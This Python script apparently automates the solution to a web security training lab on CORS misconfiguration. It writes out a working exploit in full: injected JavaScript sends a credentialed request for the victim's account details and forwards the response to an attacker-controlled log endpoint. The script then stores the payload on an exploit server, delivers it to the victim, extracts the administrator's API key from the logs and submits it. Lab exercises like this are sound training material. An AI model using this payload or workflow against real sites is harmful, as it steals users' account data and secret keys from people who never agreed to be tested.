import requests
import sys
import urllib3
import urllib.parse
import re


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def crafting_the_exploit(url):
    # some parts must be url encoded
    params = "urlIsHttps=on&responseFile=/exploit&responseHead=" + urllib.parse.quote("""HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8""") + "&responseBody=" + urllib.parse.quote(""""<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','$url/accountDetails',true);
    req.withCredentials = true;
    req.send();
    
    function reqListener() {
        location='/log?key='+this.responseText;
    };
    
</script>
""".replace('$url', url)) + "&formAction=$Action"
    return params

def storing_the_exploit(exploit_server_url, params):
    params = params.replace('$Action',"STORE")
    r = requests.post(exploit_server_url, data=params, verify=False, proxies=proxies,
                      headers={"Content-Type": "application/x-www-form-urlencoded"})


def deliver_exploit_to_the_victim(exploit_server_url, params):
    params = params.replace('$Action',"DELIVER_TO_VICTIM")
    r = requests.post(exploit_server_url, data=params, verify=False, proxies=proxies,
                      headers={"Content-Type": "application/x-www-form-urlencoded"})

def get_admin_api_key_from_logs(exploit_server_url):
        r = requests.get(exploit_server_url + "/log", verify=False, proxies=proxies)
        api_key = re.findall('apikey.*,', r.text).pop(0)
        api_key = urllib.parse.unquote(api_key).split(",").pop(0)
        api_key = api_key[10:-1]
        return api_key


def submit_solution(url, api_key):
    params ="answer=" + api_key
    r = requests.post(url + "/submitSolution", data=params, verify=False, proxies=proxies)
    if '"correct":true' in r.text:
        print("Lab solved!!")
    else:
        print("Something went wrong :(")

def main():
    if len(sys.argv) != 3:
        print("Please provide the lab url and the exploit server url. ")
        sys.exit(-1)

    url = sys.argv[1]
    exploit_server_url = sys.argv[2]
    print("Crafting the exploit")
    params = crafting_the_exploit(url)
    storing_the_exploit(exploit_server_url, params)
    print("delivering to victim")
    deliver_exploit_to_the_victim(exploit_server_url, params)
    print("searching for api key")
    api_key = get_admin_api_key_from_logs(exploit_server_url)
    print("api key found: ", api_key)
    print("submiting solution...")
    submit_solution(url, api_key)





if __name__ == "__main__":
    main()
